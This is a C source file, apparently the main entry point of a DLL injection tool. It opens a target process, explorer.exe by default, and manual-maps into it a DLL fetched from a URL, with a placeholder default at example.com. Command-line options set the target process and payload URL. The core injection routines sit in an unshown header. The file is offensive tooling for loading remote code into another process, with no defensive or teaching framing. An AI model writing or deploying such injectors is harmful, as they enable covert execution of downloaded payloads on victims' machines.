#include "injection.h"

const char* ProcName = "explorer.exe";
const char* DllURL = "https://example.com/library.dll";

int main(int argc, char* argv[]) {
	if (argc == 5) {
		for (int i = 0; i < argc; i++) {
			if (!strcmp(argv[i], "-proc")) {
				ProcName = argv[i + 1];
				continue;
			}
			if (!strcmp(argv[i], "-url")) {
				DllURL = argv[i + 1];
				continue;
			}
		}
	}

	HANDLE hProc = OpenProc(ProcName);
	if (!hProc)
		return 0;

	printf("[+] %s Handle: %p\n", ProcName, hProc);

	if (!ManualMap(hProc, DllURL)) {
		printf("[-] Injection error\n");
		CloseHandle(hProc);
		system("pause");
		return 0;
	}

	CloseHandle(hProc);

	printf("[+] Injected!\n");
	system("pause");

	return 0;
}
